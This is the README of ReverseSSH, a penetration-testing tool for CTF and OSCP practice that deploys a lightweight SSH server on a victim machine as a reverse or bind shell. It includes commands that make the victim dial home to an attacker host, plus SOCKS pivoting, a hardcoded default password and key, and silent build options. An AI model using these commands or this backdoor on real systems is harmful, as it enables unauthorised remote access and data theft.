# ReverseSSH

**A statically-linked ssh server with a reverse connection feature for simple yet powerful remote access. Most useful during HackTheBox challenges, CTFs or similar.**

Has been developed and was extensively used during OSCP exam preparation.

**[Get the latest Release](https://github.com/Fahrj/reverse-ssh/releases/latest)**

![Showcase](assets/showcase.gif)


## Features

Catching a reverse shell with _netcat_ is cool, sure, but who hasn't accidentally closed a reverse shell with a keyboard interrupt due to muscle memory?
Besides their fragility, such shells are also often missing convenience features such as fully interactive access, TAB-completion or history.

Instead, you can go the way to simply deploy the **lightweight ssh server** (<1.5MB) `reverse-ssh` onto the target, and use additional commodities such as **file transfer** and **port forwarding**!

ReverseSSH tries to bridge the gap between initial foothold on a target and full local privilege escalation.
Its main strengths are the following:

* **Fully interactive shell access** (check caveats for old windows versions below)
* **File transfer via sftp**
* **Local / remote / dynamic port forwarding**
* **Can be used as bind- and reverse-shell**
* Supports **Unix** and **Windows** operating systems

**Windows caveats**

A fully interactive powershell on windows relies on [Windows Pseudo Console ConPTY](https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/) and thus requires at least `Win10 Build 17763`.
On earlier versions you can still get an interactive reverse shell that can't handle virtual terminal codes such as arrow keys or keyboard interrupts.
In such cases you have to append the `cmd` command, i.e. `ssh <OPTIONS> <IP> cmd`.

You can achieve full interactive shell access for older windows versions by dropping `ssh-shellhost.exe` [from OpenSSH for Windows](https://github.com/PowerShell/Win32-OpenSSH/releases/latest) in the same directory as `reverse-ssh` and then use flag `-s ssh-shellhost.exe`.
This will pipe all traffic through `ssh-shellhost.exe`, which mimics a pty and transforms all virtual terminal codes such that windows can understand.


## Requirements

Simply executing the provided binaries only relies on [golang system requirements](https://github.com/golang/go/wiki/MinimumRequirements#operating-systems).

In short:

* **Linux**: kernel version 2.6.23 and higher
* **Windows**: Windows Server 2008R2 and higher or Windows 7 and higher

Compiling additionally requires the following:

* golang version 1.16
* optionally `upx` for compression (e.g. `sudo apt install upx-ucl` for Debian-based)


## Usage

Once `reverse-ssh` is running on the victim, you can connect with any username and the default password `letmeinbrudipls`, the ssh key or whatever you specified during compilation.
After all, it is just an ssh server:

```
# Fully interactive shell access
$ ssh -p <RPORT> <RHOST>

# Simple command execution
$ ssh -p <RPORT> <RHOST> whoami

# Full-fledged file transfers
$ sftp -P <RPORT> <RHOST>

# Dynamic port forwarding as SOCKS proxy on port 9050
$ ssh -p <RPORT> -D 9050 <RHOST>
```

### Running ReverseSSH as bind shell

```
# Victim
victim$ ./reverse-ssh

# Attacker (default password: letmeinbrudipls)
attacker$ ssh -p 31337 <RHOST>
```

### Running ReverseSSH as reverse shell

Note: you can compile ReverseSSH with parameters for LHOST and LPORT to ease execution on the target, [see below](#build-tricks)

```
# On attacker (get ready to catch the incoming request;
# can be omitted if you already have an ssh daemon running, e.g. OpenSSH)
# NOTE: LPORT of 8888 collides with incoming connections; use the flag `-b 8889` or similar on the victim in that case
attacker$ ./reverse-ssh -v -l -p <LPORT>

# On victim
victim$ ./reverse-ssh -p <LPORT> <LHOST>
# or in case of an ssh daemon listening at port 22 with password authentication for user 'kali'
victim$ ./reverse-ssh -p 22 kali@<LHOST>

# On attacker (default password: letmeinbrudipls)
attacker$ ssh -p 8888 127.0.0.1
# or with ssh config from below
attacker$ ssh target
```

In the end it's plain ssh, so you could catch the remote port forwarding call coming from the victim's machine with your openssh daemon listening on port 22.
Just prepend `<USER>@` and provide the password once asked to do so.

For even more convenience, add the following to your `~/.ssh/config`, copy the [ssh private key](assets/id_reverse-ssh) to `~/.ssh/` and simply call `ssh target` or `sftp target` afterwards:

```
Host target
        Hostname 127.0.0.1
        Port 8888
        IdentityFile ~/.ssh/id_reverse-ssh
        IdentitiesOnly yes
        StrictHostKeyChecking no
        UserKnownHostsFile /dev/null
```

### Full usage

```
reverseSSH v1.3.1  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

Usage: reverse-ssh [options] [[<user>@]<target>]

Examples:
  Bind:
        reverse-ssh -l
        reverse-ssh -v -l -p 4444
  Reverse:
        reverse-ssh 192.168.0.1
        reverse-ssh kali@192.168.0.1
        reverse-ssh -p 31337 192.168.0.1
        reverse-ssh -v -b 0 kali@192.168.0.2

Options:
        -l, Start reverseSSH in listening mode (overrides reverse scenario)
        -p, Port at which reverseSSH is listening for incoming ssh connections (bind scenario)
                or where it tries to establish a ssh connection (reverse scenario) (default: 31337)
        -b, Reverse scenario only: bind to this port after dialling home (default: 8888)
        -i, Reverse scenario only: attempt to authenticate with this ssh private key when dialling home
                (similar to ssh's identity_file)
        -s, Shell to spawn for incoming connections, e.g. /bin/bash; (default: /bin/bash)
                for windows this can only be used to give a path to 'ssh-shellhost.exe' to
                enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
        -N, Deny all incoming shell/exec/subsystem and local port forwarding requests
                (if only remote port forwarding is needed, e.g. when catching reverse connections)
        -v, Emit log output

<target>
        Optional target which enables the reverse scenario. Can be prepended with
        <user>@ to authenticate as a different user other than 'reverse' while dialling home

Credentials:
        Accepting all incoming connections from any user with either of the following:
         * Password "letmeinbrudipls"
         * PubKey   "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlbJwr+ueQ0gojy4QWr2sUWcNC/Y9eV9RdY3PLO7Bk/ Brudi"
```


## Build instructions

Make sure to install the above requirements such as golang in a matching version and set it up correctly.
Afterwards, you can compile with `make`, which will create static binaries in `bin`.
Use `make compressed` to pack the binaries with upx to further reduce their size.

```
$ make

# or to additionally created binaries packed with upx
$ make compressed
```

### Build tricks

You can also specify one or more of the following environmental variables when compiling to customize ReverseSSH to your use case:

* `RS_SHELL` to change the default shell
* `RS_PASS` to provide your personalized password
* `RS_PUB` to provide your personalized an authorized key
* `PRIV_KEY` to authenticate with ssh private key when dialling home
* `LUSER` to change the default username of the ssh connection attempt
* `LHOST` to provide a default LHOST value and make **ReverseSSH default to the reverse scenario**
* `LPORT` to change the default listening port or port where an ssh connection attempt is sent to
* `BPORT` to change the default listening port of reverse connections on the attacker machine; **0 means any free port is taken**
* `NOCLI` with any value removes all user-facing interaction (the binary ignores all supplied flags or arguments)

```shell
$ ssh-keygen -t ed25519 -f id_reverse-ssh

$ RS_SHELL="/bin/sh" RS_PASS="secret" RS_PUB="path/to/id_reverse-ssh.pub" make compressed

$ LHOST="192.168.0.10" LPORT="443" BPORT="0" RS_PUB="path/to/id_reverse-ssh.pub" make compressed
```

### Building for different operating systems or architectures

By default, `reverse-ssh` is compiled for your current OS and architecture, as well as for linux and windows in x86 and x64.
To compile for other architectures or another OS you can provide environmental variables which match your target, e.g. for linux/arm64:

```
$ GOARCH=arm64 GOOS=linux make compressed
```

A list of available targets in format `OS/arch` can be obtained via `go tool dist list`.


## Contribute

Is a mind-blowing feature missing? Anything not working as intended?

**Create an issue or pull request!**
